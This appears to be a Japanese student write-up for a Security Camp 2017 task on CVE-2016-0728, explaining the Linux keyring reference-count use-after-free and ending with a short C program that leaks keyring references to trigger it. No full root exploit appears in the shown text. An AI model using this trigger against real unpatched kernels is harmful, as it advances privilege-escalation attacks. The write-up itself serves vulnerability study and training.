# CVE-2016-0728

Seccamp 2017 課題

以下のプログラムはLinuxカーネル3.8〜4.4に存在する脆弱性を悪用しています。このプログラムの実行により発生する不具合を説明してください。また、この脆弱性をさらに悪用することでroot権限昇格を行うエクスプロイトを記述し、自分が試した動作環境や工夫点等を説明してください。加えて、このような攻撃を緩和する対策手法をなるべく多く挙げ、それらを説明してください。
完全には分からなくても構いませんので、理解できたところまでの情報や試行の過程、感じた事等について自分の言葉で記述してください。また参考にしたサイトや文献があれば、それらの情報源を明記してください。


---
# Reference
脆弱性の概要について、以下のサイトを参考にしました。

http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/




# Introduction
このプログラムはlinuxの鍵保存サービスのUse-After-Free脆弱性(以下UAFと書きます)を悪用しています。UAF脆弱性とは、ヒープメモリの解放後、本来使ってはならないメモリ領域に読み書き可能になることです。
まず、このプログラムで使われている、鍵保存サービスとどこにUAFが存在するのか説明し、それによってどういう不具合が生じるかについて述べます。
それぞれのプロセスは`keyctl(KEYCTL_JOIN_SESSION_KEYRING, name)`というシステムコールによって現在のセッションのためのプロセス毎の鍵リングを作成することができます。
この鍵リングは同じ鍵リングの名前を参照することによって、プロセス間で共有することができます。もしプロセスが既にセッション鍵リングを持っている場合、このシステムコールは鍵リングを新しい鍵リングと置き換えます。これがプロセス間で共有されているとき、構造体keyのusageメンバに保存されている内部の参照回数が増加します。usageメンバはatomic_tという型ですが、これは実際にはint型変数一つを含むstructのtypedefとして定義されています。また、このusageメンバのオーバーフローを防ぐ機構がないため、このメンバを増加させていくことで0になるまで参照できます。鍵リングのサブシステム内部でのガベージコレクションによってusageメンバが0になった時、その鍵リングはfreeされます。このfreeされた領域にユーザー空間から別のカーネルオブジェクトを配置することによって、任意のコードが実行できます。

---

```
#include <stddef.h>  
#include <stdio.h>  
#include <sys/types.h>  
#include <keyutils.h>  
 
int main(int argc, const char *argv[])
{
    int i = 0;
    key_serial_t serial;
 
    serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, "leaked-keyring");
if (serial < 0) {
        perror("keyctl");
        return -1;
    }
 
    if (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL) < 0) {
        perror("keyctl");
        return -1;
    }
 
    for (i = 0; i < 100; i++) {
        serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, "leaked-keyring");
        if (serial < 0) {
            perror("keyctl");
            return -1;
        }
    }
 
    return 0;
}
```


